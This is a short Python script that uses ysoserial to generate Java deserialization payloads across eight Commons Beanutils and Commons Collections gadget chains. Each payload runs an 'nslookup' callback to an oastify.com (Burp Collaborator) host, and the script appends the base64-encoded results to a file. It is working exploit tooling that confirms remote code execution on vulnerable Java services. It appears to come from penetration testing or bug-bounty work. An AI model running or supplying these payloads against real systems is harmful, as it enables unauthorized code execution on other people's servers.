import os

gadgets = ["CommonsBeanutils1","CommonsCollections1","CommonsCollections2",
           "CommonsCollections3",
           "CommonsCollections4",
           "CommonsCollections5","CommonsCollections6",
           "CommonsCollections7"]

for gadget in gadgets:
    os.system("java -jar ~/tools/ysoserial-all.jar "+ gadget + " 'nslookup vfe3b0nca4h59vcj9te13qb4hvnmbcz1.oastify.com' | base64 -w0 >> ser.txt")
    os.system('echo "\r" >> ser.txt')